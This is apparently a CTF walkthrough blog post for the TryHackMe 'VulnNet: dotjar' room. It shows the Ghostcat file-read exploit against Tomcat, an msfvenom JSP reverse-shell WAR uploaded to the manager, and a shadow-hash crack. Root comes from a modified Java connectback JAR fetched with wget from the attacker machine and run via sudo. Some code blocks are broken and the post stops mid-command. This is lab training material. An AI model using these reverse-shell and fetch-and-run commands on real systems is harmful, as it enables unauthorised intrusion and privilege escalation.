## VulnNet: dotjar
This is [VulnNet: dotjar](https://tryhackme.com/room/vulnnetdotjar) from THM. It's medium rated, and says:

>A new machine means a new web implementation. Foothold should be rather easy-going as long as you connect the dots. Privilege escalation might depend on your Java knowledge, don't worry though, I'm rather a person who avoids Java and I still had a lot of fun working on this machine.

## Ports
8009 and 8080 only. Port 8009 is *Apache Jserv (Protocol v1.3)*; this will be important.

## 8080
We have Apache Tomcat, which I've seen in several CTFs now and usually with default credentials. However, that isn't the case today - I tried a few; nothing. Now what?

## 8009
Apache Jserv (Protocol v1.3) is vulnerable to the [Ghostcat](https://www.trendmicro.com/en_us/research/20/c/busting-ghostcat-an-analysis-of-the-apache-tomcat-vulnerability-cve-2020-1938-and-cnvd-2020-10487.html) LFI vulnerability, which is also explained [here](https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74). There is an exploit on [github](https://github.com/00theway/Ghostcat-CNVD-2020-10487), and we can use it as the Medium blog describes, firstly to read WEB-INF, and then:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/dotjar]
â””â”€# python3 exploit.py  http://10.10.124.0:8080/ 8009 /WEB-INF/web.xml read

With our credentials, we can log in - but notice the line above:

So it's CLI all the way.

Generate a payload with MSFVENOM

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/dotjar]
â””â”€# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.9.10.123 LPORT=1234 -f war > shell.war
Payload size: 1087 bytes
Final size of war file: 1087 bytes
{% endhighlight %}

And send it up the line:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/dotjar]
â””â”€# curl -v -u 'REDACTED' --upload-file shell.war "http://10.10.124.0:8080/manager/text/deploy?path=/hack&update=true"

Start a listener and visit http://10.10.124.0:8080/hack/ in the browser (or curl I guess):

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/dotjar]
â””â”€# nc -nvlp 1234                                              
listening on [any] 1234 ...
connect to [10.9.10.123] from (UNKNOWN) [10.10.124.0] 60308

uid=1001(web) gid=1001(web) groups=1001(web)
{% endhighlight %}

Boom, we're on.

## Privesc
It takes some enumeration, but we find a hash for our next user:

{% highlight shell %}
web@vulnnet-dotjar:/dev/shm$ gunzip shadow-backup-alt.gz # where did it come from? find it yourself lol
web@vulnnet-dotjar:/dev/shm$ ls
ls
shadow-backup-alt
web@vulnnet-dotjar:/dev/shm$ ls -lash
ls -lash

# other hashes, you get the idea
{% endhighlight %}

From this there is a hash you can crack with John, and su to *jdk-admin*.

## Root

{% highlight shell %}
jdk-admin@vulnnet-dotjar:/dev/shm$ sudo -l
sudo -l
Password: REDACTED

Matching Defaults entries for jdk-admin on vulnnet-dotjar:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar
{% endhighlight %}

Okay so we need an executable JAR file to run; I want one to give me a reverse shell. I get it from [here](https://github.com/1captainnemo1/connectback), but it's for Windows. Nevermind, just change this:

>Process p = new ProcessBuilder("C:\\Windows\\System32\\cmd.exe").redirectErrorStream(true).start();

to this:

>Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();

We need to compile it and turn it into an executable JAR:

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/dotjar/callback]
â””â”€# javac --release 8 connectback.java                                                   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

â”Œâ”€â”€(rootðŸ’€kali)-[/opt/thm/dotjar/callback]
â””â”€# jar cmf connectback.mf connectback.jar connectback.class connectback.java
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
{% endhighlight %}

Note I had a newer JDK than the box and it wouldn't work, hence the *--release 8* option. Upload the file and run it (yeah, it took me a few goes):

{% highlight shell %}
jdk-admin@vulnnet-dotjar:/dev/shm$ !16 && !18
!16 && !18
rm connectback.jar  && wget http://10.9.10.123:9090/connectback.jar && sudo -u root /usr/bin/java -jar connectback.jar
